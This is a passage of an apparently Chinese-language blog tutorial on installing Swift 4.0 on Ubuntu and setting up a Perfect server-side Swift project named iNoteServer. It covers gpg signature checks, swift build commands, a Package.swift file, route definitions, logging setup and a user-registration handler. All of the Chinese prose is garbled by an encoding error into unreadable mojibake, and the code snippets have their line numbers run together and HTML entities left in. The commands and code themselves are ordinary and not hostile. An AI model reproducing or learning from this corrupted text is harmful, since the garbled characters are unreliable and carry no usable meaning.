è¢«è¢«æŸåæˆ–ç¯¡æ”¹ã€‚ 123456gpg --keyserver hkp://pool.sks-keyservers.net \ --recv-keys \ '7463 A81A 4B2E EA1B 551F FBCF D441 C977 412B 37AD' \ '1BE1 E29A 084C B305 F397 D62A 9F59 7F4D 21A5 6D5F' \ 'A3BA FD35 56A5 9079 C068 94BD 63BC 1CFE 91D3 06C6' \ '5E4D F843 FB06 5D7F 7E24 FBA2 EF54 30F0 71E1 B235' å¯¼å…¥å¯†é’¥ä¹‹åŽï¼Œä¸‹è½½å¯¹åº”Swiftç‰ˆæœ¬çš„ç­¾åæ–‡ä»¶ï¼š 1wget https://swift.org/builds/swift-4.0-release/ubuntu1604/swift-4.0-RELEASE/swift-4.0-RELEASE-ubuntu16.04.tar.gz.sig éªŒè¯ç­¾åæ–‡ä»¶ï¼š å¦‚æžœå‡ºçŽ°è­¦å‘Šä¿¡æ¯ï¼Œå¯å¿½ç•¥ï¼›å¦‚æžœå‡ºçŽ°é”™è¯¯ä¿¡æ¯ï¼Œå°±éœ€è¦é‡æ–°ä¸‹è½½SwiftäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ 1gpg --verify swift-4.0-RELEASE-ubuntu16.04.tar.gz.sig å®‰è£…å®Œæˆå¯†é’¥å’Œç­¾åæ–‡ä»¶ï¼ŒçŽ°åœ¨å°±å¯ä»¥å®‰è£…Swiftã€‚ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥æå–ä¹‹å‰ä¸‹è½½çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼š 1tar xzf swift-4.0-RELEASE-ubuntu16.04.tar.gz å°†Swiftå·¥å…·é“¾æ·»åŠ åˆ°çŽ¯å¢ƒå˜é‡ä¸­ï¼Œä»¥ä¾¿è¿è¡Œswiftå‘½ä»¤ï¼š 1export PATH=swift-4.0-RELEASE-ubuntu16.04/usr/bin:"$&#123;PATH&#125;" è¿™ä¸ªå‘½ä»¤åªä¼šå°†swiftå‘½ä»¤æ·»åŠ åˆ°å½“å‰shellä¼šè¯è·¯å¾„ä¸­ï¼Œå¦‚æžœè¦ç¡®ä¿å®ƒåœ¨ä»¥åŽçš„ä¼šè¯ä¸­è‡ªåŠ¨æ·»åŠ ï¼Œè¦å°†å…¶æ·»åŠ åˆ°.bashrcæ–‡ä»¶ä¸­ã€‚ æ‰“å¼€ .bashrc æ–‡ä»¶ æ–‡ä»¶å°¾éƒ¨æ·»åŠ çŽ¯å¢ƒå˜é‡ ä¿å­˜é€€å‡º 12vi ~/.bashrc // ä¹Ÿå¯ä»¥ä½¿ç”¨nanoexport PATH=swift-4.0-RELEASE-ubuntu16.04/usr/bin:"$&#123;PATH&#125;" åœ¨ç»ˆç«¯è¾“å…¥swiftï¼Œå¦‚æžœè¾“å‡ºWelcome to Apple Swift version xxxåˆ™è¡¨ç¤ºå®‰è£…swiftæˆåŠŸã€‚ PerfectæœåŠ¡ç«¯ä½¿ç”¨å·¥å…·æ–°å»ºPerfecté¡¹ç›® æƒ³ä½“éªŒä¸€ä¸ªæ–°æŠ€æœ¯ï¼Œæœ€ç®€ä¾¿çš„æ–¹æ³•èŽ«è¿‡äºŽGUIå·¥å…·ï¼Œç®€å•çš„ç‚¹å‡ ä¸‹å°±å¯ä»¥è¿è¡Œèµ·æ¥ã€‚ Perfect Assistantä¸“é—¨ç”¨äºŽæœåŠ¡å™¨ç«¯Swiftåº”ç”¨çš„å¯åŠ¨ã€ç®¡ç†ã€ç¼–è¯‘ã€æµ‹è¯•å’Œéƒ¨ç½²ï¼Œæžå¤§ç®€åŒ–äº†ä¸Šè¿°å·¥ä½œçš„æ“ä½œè¿‡ç¨‹ã€‚æ— è®ºæ˜¯åˆæ¬¡æŽ¥è§¦æœåŠ¡å™¨çš„Swiftç¨‹åºå‘˜è¿˜æ˜¯ä¼ä¸šçº§çš„æœåŠ¡å™¨Swifté«˜çº§å·¥ç¨‹å¸ˆï¼Œç›¸ä¿¡éƒ½å¯ä»¥ä»Žä¸­å—ç›Šã€‚ ä½¿ç”¨Perfectæ­å»ºæœåŠ¡ç«¯ä¹‹æ‰€ä»¥æ¯”è¾ƒå¼ºå¤§çš„åŽŸå› ä¹‹ä¸€ï¼šæä¾›äº†å¯è§†åŒ–çš„å·¥å…·å¸®åŠ©å¿«é€Ÿå…¥é—¨ä½“éªŒä¸€ä¸ªæœåŠ¡ç«¯è½¯ä»¶çš„æ­å»ºã€‚ è€Œä¸”å¥¹ä¸ä»…æ”¯æŒè‡ªå®¶çš„Perfectåº“ï¼Œè¿˜æ”¯æŒå¦ä¸€ä¸ªSwiftæœåŠ¡ç«¯å¼€å‘åº“Vaporã€‚ æ›´æ›´æ›´åŠ æ”¯æŒæ–°æ¬¾MBPçš„Touch Barï¼Œï¼Œæ©ï¼Œæˆ‘çš„è¿˜æ˜¯ä¸æ”¯æŒTouch Barçš„15æ¬¾çš„MBPðŸŒšã€‚ Perfect Assistant åŠŸèƒ½ æ–°å»ºSwiftæœåŠ¡å™¨å·¥ç¨‹ï¼Œæˆ–è€…ä»ŽçŽ°æœ‰é¡¹ç›®æ¨¡æ¿ä¸­æ–°å»ºå·¥ç¨‹ ç®¡ç†ç»„ä»¶ä¾å­˜å…³ç³» åŒæ­¥äº¤å‰ç¼–è¯‘â€”â€”å³åœ¨æ‚¨çš„macè®¡ç®—æœºä¸ŠåŒæ­¥ç¼–è¯‘åŒä¸€ä¸ªæœåŠ¡å™¨åº”ç”¨åœ¨macOSå’ŒUbuntuæ“ä½œç³»ç»Ÿä¸Šçš„äºŒè¿›åˆ¶ç¨‹åº é…ç½®äºšé©¬é€Šå¼¹æ€§è®¡ç®—æˆ–è€…è°·æ­Œäº‘åº”ç”¨ å°†é¡¹ç›®éƒ¨ç½²ä¸ºäºšé©¬é€ŠEC2å¼¹æ€§äº‘è®¡ç®—æœåŠ¡å™¨ä¾‹ç¨‹ï¼Œæˆ–è€…è°·æ­Œäº‘åº”ç”¨å¼•æ“ŽæœåŠ¡å™¨ä¾‹ç¨‹ ä¸‹è½½Perfect Assistant å®˜æ–¹ä¸‹è½½åœ°å€åœ¨è¿™é‡Œ ç‚¹å‡»ä¸‹è½½ã€å®‰è£…å³å¯ã€‚ï¼ˆæ³¨æ„éœ€è¦ç§‘å­¦ä¸Šç½‘ï¼Œå¦åˆ™å¯èƒ½å¾ˆæ…¢ï¼‰ å®‰è£…å®ŒæˆåŽæ‰“å¼€ç•Œé¢å¦‚ä¸‹ï¼š å…³äºŽdocker Perfect Assistantæ˜¯æ”¯æŒä½¿ç”¨dockerè¿›è¡Œç¼–è¯‘å’Œéƒ¨ç½²åˆ°Linuxä¸Šçš„ï¼Œå®‰è£…dockeråŽå°±å¯ä»¥åœ¨æœ¬åœ°å¯¹ä»£ç è¿›è¡ŒlinuxçŽ¯å¢ƒçš„ç¼–è¯‘åŽç›´æŽ¥éƒ¨ç½²åˆ°linuxæœåŠ¡å™¨ä¸Šã€‚ æ›´é‡è¦çš„æ˜¯ï¼šä½¿ç”¨dockerå¯ä»¥æ‰“åŒ…åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åŽå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„Linuxæœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®žçŽ°è™šæ‹ŸåŒ–ã€‚å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æŽ¥å£ã€‚ä»¥åŽéœ€è¦å…¶ä»–linuxä¸Šéƒ¨ç½²ï¼Œåªéœ€è¦å°†åˆ¶ä½œå¥½çš„dockeré•œåƒæ‹‰å–ä¸‹æ¥å°±å¯ä»¥è¿è¡Œï¼Œä¸éœ€è¦å†é…ç½®çŽ¯å¢ƒå’Œä¾èµ–ã€‚ å®‰è£…dockerå¤§æ¦‚éœ€è¦15Gå·¦å³çš„ç£ç›˜ç©ºé—´ï¼Œæˆ‘å› ä¸ºç³»ç»Ÿç›˜ç£ç›˜ç©ºé—´æœ‰é™ï¼Œå°±æ²¡æœ‰å®‰è£…ã€‚ä¹‹å‰è¯•äº†ä¸‹å®‰è£…å¤§æ¦‚éœ€è¦å‡ åˆ†é’Ÿæ—¶é—´ï¼ˆå‰æç½‘é€Ÿå¤Ÿå¿«ï¼‰ã€‚ éœ€è¦å®‰è£…çš„å°ä¼™ä¼´ï¼Œç›´æŽ¥ç‚¹å‡»å¦‚å›¾æ‰€ç¤ºçš„ ç«‹å³å®‰è£…dockerã€ç­‰å¾…å®‰è£…å®Œæˆå³å¯ã€‚ å…³äºŽæƒ³äº†è§£æ›´å¤šdockerçŸ¥è¯†çš„ï¼Œå®˜ç½‘åœ¨è¿™é‡Œã€‚ ä½¿ç”¨Perfect Assistantåˆ›å»ºé¡¹ç›® å®‰è£…å¥½Perfect AssistantåŽï¼Œå¿«é€Ÿåˆ›å»ºä¸€ä¸ªæœåŠ¡ç«¯åº”ç”¨ï¼Œåªéœ€è¦ç‚¹å‡»åˆ›å»ºé¡¹ç›®çª—å£çš„Perfectæ¨¡æ¿Appï¼š é€‰æ‹©é¡¹ç›®éœ€è¦æ”¾ç½®çš„æ–‡ä»¶ç›®å½•åŠé¡¹ç›®åç§°ï¼ˆæˆ‘è¿™é‡Œè¿˜æ˜¯ä»¥æœ€æ—©ä½“éªŒæœåŠ¡ç«¯é¡¹ç›®çš„åå­—å‘½åï¼‰ã€‚ çº¢æ¡†é€‰é¡¹å¯é€‰å¯ä¸é€‰ï¼Œå‹¾é€‰åŽåœ¨Xcodeç¼–è¯‘é¡¹ç›®çš„æ—¶å€™ä¼šï¼Œä¼šè¿è¡ŒåŠåé¦ˆä¸€äº›linuxçŽ¯å¢ƒçš„ç¼–è¯‘ä¿¡æ¯ï¼ŒåŽé¢éœ€è¦çš„æ—¶å€™å¯ä»¥å†é‡æ–°å‹¾é€‰ï¼ŒçŽ°åœ¨çš„ç”µè„‘é…ç½®å…¶å®žå‹¾é€‰äº†ä¹Ÿå¹¶ä¸ä¼šå¢žåŠ å¤ªé•¿çš„ç¼–è¯‘æ—¶é—´ã€‚ é…ç½®å¤„ç†é¡¹ç›®ä¾èµ– é¡¹ç›®ä¾èµ–éƒ½æ˜¯é€šè¿‡Swiftçš„åŒ…ç®¡ç†å™¨å¤„ç†çš„ï¼ŒSwiftåŒ…ä¾èµ–ç®¡ç†è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£. åˆ›å»ºé¡¹ç›®å®Œæˆä¼šé»˜è®¤å…ˆæ‹‰å–æ¨¡æ¿åº”ç”¨çš„ç›¸å…³ä¾èµ–ï¼Œåœ¨é»˜è®¤åº”ç”¨ä¸­é»˜è®¤å·²ç»é…ç½®è¿‡HTTPServerä¾èµ–äº†ï¼Œå¤„ç†çª—å£å¦‚ä¸‹ï¼š åŽæœŸéœ€è¦æ·»åŠ è‡ªå·±çš„ä¾èµ–åº“æ—¶å€™ï¼Œå¦‚æ•°æ®åº“ã€æ‰“å°ç­‰ç­‰ï¼Œåªéœ€è¦åœ¨ä¸‹é¢çš„å¯ç”¨ä¾èµ–çª—å£ä¸­é€‰æ‹©éœ€è¦ä¾èµ–ç›´æŽ¥æ‹–æ‹½åˆ°ä¸Šé¢é¡¹ç›®ä¾èµ–çª—å£å³å¯ã€‚ å¦‚æžœåœ¨å¯ç”¨ä¾èµ–çª—å£æ²¡æœ‰æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„ï¼Œä¹Ÿå¯ä»¥ç‚¹é¡¹ç›®ä¾èµ–çª—å£å³è¾¹çš„+å·æŒ‰é’®ï¼Œæ·»åŠ è‡ªå®šä¹‰çš„é¡¹ç›®ä¾èµ–ï¼šå…¶å®žå°±æ˜¯æ·»åŠ ä¾èµ–çš„Package Manageråœ°å€åŠåŠŸèƒ½ç±»åˆ«ã€‚ æ›´å¤šPerfect Assistantå·¥å…·ä½¿ç”¨åŠåŠŸèƒ½ä»‹ç»ï¼Œè¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚ ç¼–è¯‘è¿è¡Œé¡¹ç›® é¡¹ç›®ä¾èµ–å¤„ç†å®Œæˆï¼Œå°±å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬åˆ›å»ºçš„é¡¹ç›®ç›®å½•ä¸‹çš„iNoteServer.xcodeprojæ–‡ä»¶ï¼Œå…·ä½“åç§°è¯·å‚è€ƒä½ åˆ›å»ºé¡¹ç›®çš„åç§°ï¼Œé€šè¿‡Xcodeæ‰“å¼€ã€‚ æ³¨æ„ï¼Œåœ¨é¡¹ç›®Schemeä¸­é€‰æ‹©å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé»˜è®¤é€‰ä¸­çš„çš„æ˜¯é¡¹ç›®åç§°-Packageã€‚ ç„¶åŽç›´æŽ¥ç¼–è¯‘è¿è¡Œï¼Œå°±å¯ä»¥çœ‹åˆ°æŽ§åˆ¶å°è¾“å‡ºï¼š 1[INFO] Starting HTTP server localhost on 0.0.0.0:8181 æ­¤æ—¶å°±å·²ç»å¼€äº†ä¸€ä¸ªæœ¬åœ°ç«¯å£8181çš„æœåŠ¡ï¼Œç›´æŽ¥åœ¨æµè§ˆå™¨è¾“å…¥ä¸Šè¿°åœ°å€åŠç«¯å£ï¼Œå°±å¯ä»¥çœ‹åˆ°ä»¤äººå…´å¥‹çš„Hello, world!äº†ã€‚ ä½¿ç”¨ç»ˆç«¯æ–°å»ºPerfecté¡¹ç›® ä½¿ç”¨ç»ˆç«¯å‘½ä»¤åˆ›å»ºé¡¹ç›®ä¹Ÿä¸æ˜¯å¾ˆå¤æ‚ï¼Œé‡è¦çš„æ˜¯å¯ä»¥è‡ªå·±æŠŠæŽ§é¡¹ç›®åˆ›å»ºçš„ç»†èŠ‚ï¼Œåˆ›å»ºå‡ºæ¥çš„é¡¹ç›®æ›´åŠ çš„å¹²å‡€ï¼Œæˆ‘æ¯”è¾ƒå–œæ¬¢ä½¿ç”¨ç»ˆç«¯åˆ›å»ºé¡¹ç›®ã€‚ ä½¿ç”¨ç»ˆç«¯æ–°å»ºé¡¹ç›® åˆ›å»ºä¸€ä¸ªå­˜æ”¾é¡¹ç›®çš„æ–‡ä»¶å¤¹iNoteï¼ŒåŽç»­æœåŠ¡ç«¯å¯¹åº”çš„å®¢æˆ·ç«¯é¡¹ç›®iNoteClientä¹Ÿå¯ä»¥æ”¾åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹å†…ã€‚ åœ¨iNoteæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªå­˜æ”¾æœåŠ¡ç«¯é¡¹ç›®çš„æ–‡ä»¶å¤¹iNoteServerã€‚ å°†iNoteServerç›®å½•åˆå§‹åŒ–ä¸ºä¸€ä¸ªGitä»“åº“ã€‚ åˆ›å»ºPackage.swiftæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ˜¯ç”¨SwiftåŒ…ç®¡ç†å™¨ï¼ˆSPMï¼‰ç®¡ç†ä¾èµ–éœ€è¦çš„ï¼Œç”¨æ¥ç®¡ç†æ•´ä¸ªé¡¹ç›®çš„ä¾èµ–ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Xcodeæ‰“å¼€è¯¥æ–‡ä»¶ï¼Œç¼–è¾‘æ·»åŠ éœ€è¦çš„é¡¹ç›®ä¾èµ–ã€‚å¦‚ï¼š 123456789101112131415import PackageDescriptionlet versions = Version(0,0,0)..&lt;Version(10,0,0)let urls = [ "https://github.com/PerfectlySoft/Perfect-HTTPServer.git", // æœ€åŸºæœ¬çš„æœåŠ¡å™¨æ ¸å¿ƒä¾èµ– "https://github.com/PerfectlySoft/Perfect-MySQL.git", // MySQLæœåŠ¡å™¨ "https://github.com/PerfectlySoft/Perfect-Logger.git", // æ—¥å¿—å¤„ç†åº“ "https://github.com/PerfectlySoft/Perfect-RequestLogger.git" // è¯·æ±‚æ—¥å¿—å¤„ç†åº“]let package = Package( name: "iNoteServer", targets: [], dependencies: urls.map &#123; .Package(url: $0, versions: versions) &#125;) å›žåˆ°ç»ˆç«¯ï¼Œåˆ›å»ºSourcesç›®å½•ï¼Œè¯¥ç›®å½•ç”¨äºŽå­˜æ”¾æˆ‘ä»¬è‡ªå·±å†™çš„é¡¹ç›®æºä»£ç ã€‚ åˆ›å»ºä¸€ä¸ªç¨‹åºå…¥å£æ–‡ä»¶ï¼Œå¹¶åœ¨ç©ºæ–‡ä»¶ä¸­æ’å…¥ä¸€ä¸ªæ‰“å°å‡½æ•°ï¼š 1echo 'print("hello world!")' &gt;&gt; Sources/main.swift é…ç½®å¤„ç†é¡¹ç›®ä¾èµ– é¡¹ç›®ä¾èµ–å·²ç»é…ç½®å®Œæˆï¼Œæ­¤æ—¶éœ€è¦å¤„ç†é¡¹ç›®ä¾èµ–å¹¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š å¤„ç†è¿‡ç¨‹ä¼šåœ¨ç»ˆç«¯è¾“å‡ºå¯¹åº”çš„ä¿¡æ¯ï¼Œæ—¶é—´é•¿çŸ­å–å†³äºŽåœ¨Package.swiftæ–‡ä»¶ä¸­é…ç½®çš„ä¾èµ–åº“å¤šå°‘åŠæ¯ä¸ªåº“å¤§å°ã€‚ ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶åœ¨é¡¹ç›®çš„æ ¹ç›®å½•çš„debugç›®å½•ä¸‹ã€‚ 1swift build é»˜è®¤æ˜¯ç”Ÿæˆçš„Debugç‰ˆæœ¬çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚æžœæ˜¯æ­£å¼éƒ¨ç½²æœåŠ¡å™¨çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤ç”Ÿæˆå‘å¸ƒç‰ˆæœ¬å¯æ‰§è¡Œæ–‡ä»¶ï¼š ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶åœ¨é¡¹ç›®çš„æ ¹ç›®å½•çš„releaseç›®å½•ä¸‹ã€‚ 1swift build -c release ä¸€èˆ¬å¾ˆå¿«å°±å¯ä»¥å¤„ç†å®Œæˆï¼Œå¤„ç†å®Œæˆå°±ä¼šåœ¨ç»ˆç«¯è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†ä¸€ä¸ªç”±é¡¹ç›®åç§°å‘½åçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ ¹æ®æç¤ºä¿¡æ¯æ‰§è¡Œå¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°±å¯ä»¥è¾“å‡ºæˆ‘ä»¬çš„æ‰“å°ä¿¡æ¯äº†ï¼š 12./build/debug/iNoteServer // debugæ¨¡å¼./build/release/iNoteServer // releaseæ¨¡å¼ å¯ä»¥ä½¿ç”¨SwiftåŒ…ç®¡ç†å™¨åˆ›å»ºä¸€ä¸ªxxx.xcodeprojæ–‡ä»¶ç”¨äºŽä½¿ç”¨Xcodeæ¥ç®¡ç†å’Œç¼–è¾‘è°ƒè¯•é¡¹ç›®ï¼Œæ‰§è¡Œä¸‹é¢çš„æŒ‡ä»¤ï¼Œç”ŸæˆXcodeé¡¹ç›®ç®¡ç†æ–‡ä»¶ï¼š 1swift package generate-xcodeproj é…ç½®é¡¹ç›®æ–‡ä»¶çš„æœç´¢ç›®å½•ä¸ºæ•´ä¸ªé¡¹ç›®ç›®å½•ï¼š $(SRCROOT)ä»£è¡¨çš„æ—¶é¡¹ç›®æ ¹ç›®å½•ä¸‹ $(PROJECT_DIR)ä»£è¡¨çš„æ˜¯æ•´ä¸ªé¡¹ç›® 1$(PROJECT_DIR) å¦‚æžœæ·»åŠ æ–°çš„é¡¹ç›®ä¾èµ–åº“åŽåªéœ€è¦é‡æ–°swift build æˆ–è€… swift build -c releaseç­‰å¾…å®Œæˆå³å¯ã€‚ å¦‚æžœæ·»åŠ æ–°çš„ä¾èµ–åŽå‡ºçŽ°æœªçŸ¥é”™è¯¯ï¼Œå¯å°è¯•åˆ é™¤é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„xxx.xcodeprojæ–‡ä»¶ï¼Œç„¶åŽä½¿ç”¨swift package generate-xcodeprojé‡æ–°ç”Ÿæˆé¡¹ç›®æ–‡ä»¶å³å¯ã€‚ æ­å»ºHTTPæœåŠ¡å™¨ åˆ›å»ºiNoteAIPæ–‡ä»¶ï¼Œç”¨äºŽç®¡ç†æ‰€æœ‰çš„è·¯ç”±ã€‚å¤§æ¦‚åˆ†ä¸ºç”¨æˆ·åŠç¬”è®°ä¸¤ç±»ã€‚ 12345678910111213141516171819202122enum iNoteAIP: String &#123; case base = "/iNote" /// æ³¨å†Œé¡µé¢ case register = "/register" /// ç™»å½•é¡µé¢ case login = "/login" /// èŽ·å–ç¬”è®°åˆ—è¡¨ case notes = "/notes" /// æ·»åŠ ç¬”è®° case creatNote = "/creatNote" /// åˆ é™¤ç¬”è®° case removeNote = "/removeNote" /// ä¿®æ”¹ç¬”è®° case editNote = "/editNote"&#125; åˆ›å»ºä¸€ä¸ªNetworkServerManageræ–‡ä»¶ç”¨äºŽæœåŠ¡å™¨çš„ç›¸å…³æ“ä½œï¼Œå¦‚æœåŠ¡å™¨å¼€å¯åŠåœæ­¢ï¼Œç«¯å£ç›‘æŽ§ã€è·¯ç”±ç›‘æŽ§åŠå¤„ç†ç­‰ç­‰ã€‚ å…³äºŽæœåŠ¡å™¨APIè®¾è®¡åŠå‘½åï¼Œè¯·å‚è€ƒæœåŠ¡ç«¯æŒ‡å— | è‰¯å¥½çš„ API è®¾è®¡æŒ‡å—è¿™ä¸€ç¯‡æ–‡ç« ï¼Œå†™çš„å¾ˆä¸é”™ã€‚ é¦–å…ˆå®žä¾‹åŒ–ä¸€ä¸ªHTTPServerå¯¹è±¡ï¼Œç»‘å®šæŒ‡å®šçš„ç«¯å£ï¼Œå¹¶æ·»åŠ é¡¹ç›®éœ€è¦ç”¨åˆ°çš„è·¯ç”±ã€‚ 1234567891011121314151617181920212223242526272829303132// å¯¼å…¥éœ€è¦çš„å¤´æ–‡ä»¶import PerfectHTTPimport PerfectHTTPServerimport PerfectRequestLoggerimport PerfectLoggerclass NetworkServerManager &#123; let server = HTTPServer() var routes = Routes(baseUri: iNoteAIP.base.rawValue) var api1Routes = Routes(baseUri: "/v1") // å°†æ‰€æœ‰çš„è·¯ç”±æ ¹æ®ç‰ˆæœ¬å·è¿›è¡ŒåŒºåˆ†ç®¡ç†ï¼Œæ–¹ä¾¿åŽæœŸæŽ¥å£é€»è¾‘è°ƒæ•´ï¼Œæ–°ç‰ˆæœ¬ä¸ä¼šå½±å“åˆ°æ—§ç‰ˆæœ¬ static let shared = NetworkServerManager() private init() &#123; routesConfigure() // é…ç½®è·¯ç”± loggerConfigure() // é…ç½®æ—¥å¿—å·¥å…· &#125; func serverStart(_ port: UInt16 = 8181) &#123; // ç›‘å¬ç«¯å£ ç»‘å®šè·¯ç”± server.serverPort = port server.addRoutes(routes) do &#123; try server.start() &#125; catch PerfectError.networkError(let code, let message) &#123; print("network error:\(code) \(message)") &#125; catch &#123; print("unknow network error: \(error)") &#125; &#125;&#125; å…·ä½“çš„é¡¹ç›®æ·»åŠ çš„è·¯ç”±ï¼ˆä»¥æ³¨å†Œä¸ºä¾‹å­ï¼‰ä»¥åŠé…ç½®ç³»ç»Ÿçš„æ—¥å¿—å·¥å…·ï¼ˆæ—¥å¿—ä¿¡æ¯è®°å½•åˆ°æœ¬åœ°æ–‡ä»¶ï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243extension NetworkServerManager &#123; private func addRoute(with method: HTTPMethod, uri: iNoteAIP, handler: @escaping RequestHandler) &#123; api1Routes.add(method: method, uri: uri.rawValue, handler: handler) &#125; /// é…ç½®å„ä¸ªæ¨¡å—çš„è·¯ç”± private func routesConfigure() &#123; addRoute(with: .post, uri: .register, handler: registerHanlder())// addRoute(with: .post, uri: .login, handler: loginHanlder())//// addRoute(with: .post, uri: .creatNote, handler: creatNoteHanlder())// addRoute(with: .post, uri: .editNote, handler: editNoteHanlder())// addRoute(with: .delete, uri: .removeNote, handler: removeNoteHanlder())// addRoute(with: .get, uri: .notes, handler: notesHanlder()) // æ‰€æœ‰è·¯ç”± routes.add(api1Routes) &#125; /// æ·»åŠ æ—¥å¿—æ–‡ä»¶è®°å½• private func loggerConfigure() &#123; // æ—¥å¿—è·¯å¾„ let logPath = "./files/logs" if !Dir(logPath).exists &#123; try? Dir(logPath).create() &#125; LogFile.location = "\(logPath)/iNoteServer.log" // è®¾ç½®æ—¥å¿—æ–‡ä»¶è·¯å¾„ // å¢žåŠ æ—¥å¿—è¿‡æ»¤å™¨ï¼Œå°†æ—¥å¿—å†™å…¥ç›¸åº”çš„æ–‡ä»¶ server.setRequestFilters([(RequestLogger(), .high)]) // é¦–å…ˆå¢žåŠ é«˜ä¼˜å…ˆçº§çš„è¿‡æ»¤å™¨ server.setResponseFilters([(RequestLogger(), .low)]) // æœ€åŽå¢žåŠ ä½Žä¼˜å…ˆçº§çš„è¿‡æ»¤å™¨ // é¡¹ç›®ä¸­æ ¹æ®æ‰“å°çº§åˆ«æ‰“å°ä¿¡æ¯ //LogFile.debug("è°ƒè¯•") //LogFile.info("æ¶ˆæ¯") //LogFile.warning("è­¦å‘Š") //LogFile.error("å‡ºé”™") //LogFile.critical("ä¸¥é‡é”™è¯¯") //LogFile.terminal("æœåŠ¡å™¨ç»ˆæ­¢") &#125;&#125; å¤„ç†è·¯ç”±ç»‘å®šçš„å›žè°ƒï¼Œå³å½“ç”¨æˆ·è§¦å‘çš„å¯¹åº”æŽ¥å£ä¼šåœ¨è¿™ä¸ªåœ°æ–¹å¤„ç†ï¼Œä»¥æ³¨å†Œè·¯ç”±ç»‘å®šçš„å›žè°ƒä¸ºä¾‹å­ï¼š 123456789101112131415//MARK: å¤„ç†è·¯ç”±å›žè°ƒextension NetworkServerManager &#123; func registerHanlder() -&gt; RequestHandler &#123; return &#123; request, response in let user = User() user.userName = request.param(name: "userName") user.password = request.param(name: "password") let resultString = UserMediator.creat(a: user) response.setBody(string: resultString) response.completed() &#125; &#125;&#125; åˆ›å»ºä¸€ä¸ªUserMediatoræ–‡ä»¶ä½œä¸ºç”¨æˆ·é€»è¾‘çš„ä¸­é—´å±‚ï¼Œç”¨äºŽç®¡ç†ç”¨æˆ·çš„ç›¸å…³çš„é€»è¾‘ï¼Œå¦‚ç”¨æˆ·æ˜¯å¦é‡åã€å‚æ•°æ˜¯å¦åˆæ³•ï¼Œå“åº”æ•°æ®æ ¼å¼å¤„ç†ç­‰ç­‰ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970enum ResponseStatus: String &#123; case success = "Success" case failure = "Failure"&#125;enum ResponseErrorMessage: String &#123; case parameterIncompleteness = "å‚æ•°ä¸å®Œæ•´" case userExist = "ç”¨æˆ·å·²ç»æ³¨å†Œ" case userCreationFailed = "ç”¨æˆ·æ³¨å†Œå¤±è´¥" case wrongUsernameOrPassword = "ç”¨æˆ·åå¯†ç é”™è¯¯"&#125;let TableName = "T_User" // æ•°æ®åº“ä¸­çš„ç”¨æˆ·è¡¨class UserMediator &#123; /// åˆ›å»ºæˆåŠŸè¿”å›žå¯¹åº”çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä¸æˆåŠŸè¿”å›žå¤±è´¥åŽŸå›  static func creat(a user: User) -&gt; String &#123; guard let userName = user.userName, let password = user.password, userName.count &gt; 0, password.count &gt; 0 else &#123; return self.handle(with: .failure, isSuccess: false, message: ResponseErrorMessage.parameterIncompleteness.rawValue, value: []) &#125; // ç”¨æˆ·æ˜¯å¦å­˜åœ¨ let isExist = DataBaseManager.shared.isExist(of: userName, in: TableName) if isExist &#123; return self.handle(with: .failure, isSuccess: false, message: ResponseErrorMessage.userExist.rawValue, value: []) &#125; // åˆ›å»ºç”¨æˆ· let isSuccess = DataBaseManager.shared.store(user: user, to: TableName) if !isSuccess &#123; return self.handle(with: .failure, isSuccess: false, message: ResponseErrorMessage.userCreationFailed.rawValue, value: []) &#125; // æ˜¯å¦åˆ›å»ºç”¨æˆ·æˆåŠŸ let users = DataBaseManager.shared.users(of: userName, in: TableName) return self.handle(with: .success, isSuccess: true, message: nil, value: users) &#125;&#125;extension UserMediator &#123; /// æœåŠ¡å™¨å“åº”æ•°æ®å¤„ç† /// /// - Parameters: /// - state: æœåŠ¡å™¨å“åº”ç»“æžœï¼ˆå®žé™…å¤„ç†åº”è¯¥ä¸ºå“åº”ç»“æžœçŠ¶æ€æžšä¸¾ï¼Œæœ¬å¤„ç®€å•çš„å¤„ç†ä¸ºæˆåŠŸ/å¤±è´¥ï¼‰ /// - isSuccess: æ˜¯å¦æˆåŠŸçš„æ ‡è®° /// - message: æè¿°ä¿¡æ¯ /// - value: å“åº”æ•°æ® /// - Returns: å“åº”æ•°æ®åºåˆ—åŒ–ä¸ºjsonå­—ç¬¦ä¸² static func handle(with state: ResponseStatus, isSuccess: Bool, message: String?, value: [[String: Any]]?) -&gt; String &#123; let resultDict: [String : Any] = [ "status" : state.rawValue, "flag" : isSuccess, "message" : message ?? "", "value" : value ?? [] ] do &#123; return try resultDict.jsonEncodedString() &#125; catch &#123; print(error) return "" &#125; &#125;&#125; MySQLæ•°æ®åº“ 